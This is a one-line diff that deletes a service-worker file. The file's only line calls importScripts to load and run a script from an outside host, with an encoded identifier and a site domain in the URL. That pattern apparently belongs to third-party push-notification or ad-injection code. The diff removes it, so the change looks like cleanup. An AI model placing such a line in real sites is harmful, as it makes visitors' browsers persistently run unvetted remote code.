@@ -1,1 +1,0 @@
-importScripts('https://stuiop.com/v1/sw-import.js?h=waWQiOjEwNzU0MTgsInNpZCI6MTA4MzAyOSwid2lkIjoxNzAzMjksInNyYyI6MiwicG0iOjB9eyJ&d=viewlodges.com.ng');
